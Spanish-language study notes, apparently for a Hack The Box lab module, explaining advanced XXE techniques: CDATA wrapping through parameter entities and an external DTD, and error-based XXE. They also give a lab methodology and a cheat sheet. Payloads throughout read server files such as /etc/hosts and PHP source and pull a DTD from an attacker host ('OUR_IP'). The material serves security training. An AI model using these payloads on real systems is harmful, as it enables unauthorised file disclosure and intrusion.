
## 1. ¿Cuándo necesitamos técnicas avanzadas?

Una XXE básica puede no funcionar en determinadas situaciones:

- El archivo contiene caracteres especiales que rompen el formato XML.
    
- Queremos leer código fuente que no se puede mostrar directamente.
    
- La aplicación no devuelve los valores de las entidades XML.
    
- La aplicación muestra errores que podemos utilizar para extraer información.
    

En esta sección veremos dos técnicas principales:

1. **Exfiltración mediante CDATA y entidades de parámetro.**
    
2. **XXE basado en errores (Error-Based XXE).**
    

---

## 2. Exfiltración avanzada mediante CDATA

### ¿Qué es CDATA?

CDATA permite indicar que un fragmento del documento XML debe tratarse como texto sin analizar sus caracteres como marcado XML.

Su estructura es:

```
<![CDATA[ CONTENIDO ]]>
```

Esto puede resultar útil al intentar extraer código fuente que contiene caracteres como `<`, `>` o `&`.

### El problema de las entidades

Intentar combinar directamente entidades internas y externas de esta forma no funciona en el escenario descrito:

```
<!DOCTYPE email [
    <!ENTITY begin "<![CDATA[">
    <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
    <!ENTITY end "]]>">
    <!ENTITY joined "&begin;&file;&end;">
]>
```

XML impone restricciones a la combinación de entidades. Por ello, el módulo utiliza **entidades de parámetro XML** y un DTD externo para construir el contenido.

### ¿Qué son las entidades de parámetro?

Son entidades especiales que se declaran con `%` y se utilizan dentro del DTD.

Ejemplo:

```
<!ENTITY % begin "<![CDATA[">
```

Para referenciarlas dentro del DTD se utiliza esta sintaxis:

```
%begin;
```

La diferencia importante es:

|Tipo|Declaración|Referencia|
|---|---|---|
|Entidad general|`<!ENTITY company "valor">`|`&company;`|
|Entidad de parámetro|`<!ENTITY % begin "valor">`|`%begin;`|

### Flujo de explotación

El procedimiento descrito por HTB es:

1. Crear un DTD externo en nuestra máquina.
    
2. Iniciar un servidor HTTP para alojar ese DTD.
    
3. Hacer que la aplicación vulnerable cargue el DTD externo.
    
4. Definir las entidades necesarias para envolver el archivo con CDATA.
    
5. Referenciar la entidad resultante en un campo que se refleje en la respuesta.
    

Crear el archivo `xxe.dtd`:

```
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```

Iniciar el servidor HTTP:

```
python3 -m http.server 8000
```

La estructura del payload XML utilizado en el módulo es:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY % begin "<![CDATA[">
    <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
    <!ENTITY % end "]]>">
    <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
    %xxe;
]>
```

Después, la aplicación debe procesar la entidad `joined` en el campo donde se quiere obtener la salida.

**Importante:** `OUR_IP` debe sustituirse por la dirección IP de nuestra máquina accesible desde el objetivo. El servidor debe estar escuchando en el puerto indicado y el objetivo debe poder conectarse a él.

### ¿Por qué utilizar esta técnica?

Permite intentar recuperar archivos cuyo contenido no puede insertarse directamente como texto XML, sin tener que recurrir a la codificación Base64.

**Limitaciones:**

- El analizador debe permitir entidades externas y entidades de parámetro.
    
- El servidor debe poder acceder al DTD externo.
    
- Algunas configuraciones modernas bloquean estas técnicas o imponen restricciones para evitar bucles de entidades y denegaciones de servicio.

## 3. XXE basado en errores (Error-Based XXE)

### ¿Cuándo se utiliza?

Puede ocurrir que la aplicación procese XML, pero no muestre ninguna de las entidades proporcionadas en la respuesta.

En ese caso, no podemos recuperar directamente el contenido de un archivo mediante un campo reflejado.

Sin embargo, si la aplicación revela errores de ejecución, podemos intentar provocar un error que incluya información controlada por nosotros.

### Paso 1. Comprobar si se muestran errores

Podemos enviar XML malformado o hacer referencia a una entidad inexistente.

Ejemplo conceptual:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY missing "&nonExistingEntity;">
]>
<root>
    <email>&missing;</email>
</root>
```

Si la aplicación devuelve un error detallado, debemos examinarlo para comprobar qué información revela.

Los errores pueden exponer rutas del servidor, detalles del analizador XML u otra información útil para continuar la enumeración.

### Paso 2. Crear un DTD externo

El módulo propone un DTD que combina una referencia a un archivo con una entidad inexistente, provocando un error que puede revelar el contenido del archivo.

Ejemplo del material:

```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

La idea es que el analizador intente procesar una referencia inválida y que el error incluya información procedente de la combinación.

### Paso 3. Referenciar el DTD desde el XML

El documento XML carga el DTD externo y procesa la entidad correspondiente:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
    %remote;
    %error;
]>
```

Si el analizador permite esta construcción y la aplicación devuelve errores detallados, la respuesta podría revelar el contenido de `/etc/hosts`.

### Paso 4. Leer otros archivos

El procedimiento puede adaptarse a otros archivos accesibles para el proceso del servidor.

Por ejemplo, el material menciona cambiar la ruta del archivo para intentar recuperar el código fuente de:

```
/var/www/html/submitDetails.php
```

Esta técnica puede ser menos fiable que la extracción mediante CDATA, porque:

- Los mensajes de error pueden tener límites de longitud.
    
- Los caracteres especiales pueden romper la referencia.
    
- La aplicación puede ocultar los errores.
    
- El analizador XML puede rechazar la construcción.
    

**La condición esencial es que la aplicación revele errores útiles.** Si no devuelve salida ni errores, tendremos que recurrir a técnicas de XXE a ciegas, que se estudian en la siguiente sección.

---

## 4. Comparación de técnicas

|Técnica|Cuándo utilizarla|Requisito principal|
|---|---|---|
|XXE básica|El contenido de la entidad se refleja en la respuesta.|Entidades externas habilitadas y salida visible.|
|PHP `php://filter` + Base64|Se intenta leer código fuente PHP que contiene caracteres especiales.|Backend PHP y wrapper disponible.|
|CDATA + DTD externo|Se necesita extraer contenido que no encaja directamente en XML.|Entidades externas y de parámetro permitidas.|
|Error-Based XXE|La aplicación no refleja entidades, pero revela errores detallados.|Errores útiles y controlables.|
|Blind XXE|No hay salida útil ni errores que permitan recuperar el contenido.|Un canal alternativo de detección o exfiltración.|

---

## 5. Metodología para el laboratorio

Cuando una XXE básica no permita recuperar un archivo, sigue este orden:

1. **Comprueba la salida:** identifica si algún campo XML se refleja en la respuesta.
    
2. **Comprueba los errores:** envía XML malformado o referencia una entidad inexistente y analiza la respuesta.
    
3. **Evalúa el formato del archivo:** si los caracteres especiales rompen la salida, considera CDATA o Base64 cuando corresponda.
    
4. **Comprueba las entidades externas:** determina si el analizador permite cargar recursos externos.
    
5. **Evalúa los DTD externos:** comprueba si el servidor puede acceder a un DTD alojado en tu máquina.
    
6. **Si no existe salida ni errores útiles:** pasa a estudiar las técnicas de XXE a ciegas.
    

### Chuleta rápida

- `<![CDATA[ ... ]]>`: permite tratar el contenido como datos de texto sin analizarlo como marcado XML.
    
- `%nombre;`: referencia una entidad de parámetro dentro del DTD.
    
- `&nombre;`: referencia una entidad general dentro del documento XML.
    
- DTD externo: permite definir entidades en un recurso separado que la aplicación intenta cargar.
    
- Error-Based XXE: aprovecha errores detallados para intentar recuperar información.
    
- Blind XXE: se utiliza cuando la aplicación no ofrece una salida directa útil.
    

**Idea clave para el examen:** la técnica que debes elegir depende de cómo se comporta la aplicación: salida reflejada, errores visibles o ausencia total de información.
